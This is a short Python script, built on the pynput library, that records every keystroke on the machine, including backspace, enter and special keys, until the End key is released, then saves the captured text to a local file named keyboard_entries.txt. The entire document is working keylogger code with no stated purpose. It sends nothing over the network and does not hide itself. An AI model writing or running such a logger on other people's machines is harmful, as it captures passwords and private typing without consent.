from pynput import keyboard

words = []


def on_key_press(key):
    try:
        char = key.char
        words.append(char)

    except AttributeError:
        if key == keyboard.Key.backspace:
            if words:
                words.pop()
        elif key == keyboard.Key.enter:
            words.append("\n")

        elif key == keyboard.Key.space:
            words.append(" ")
        elif key == keyboard.Key.tab:
            words.append("\t")
        else:
            words.append("\n" + str(key) + "\n")


def on_release(key):
    if key == keyboard.Key.end:
        return False


with keyboard.Listener(on_press=on_key_press, on_release=on_release) as listener:
    listener.join()
with open("keyboard_entries.txt", "w") as file:
    file.write("".join(words))
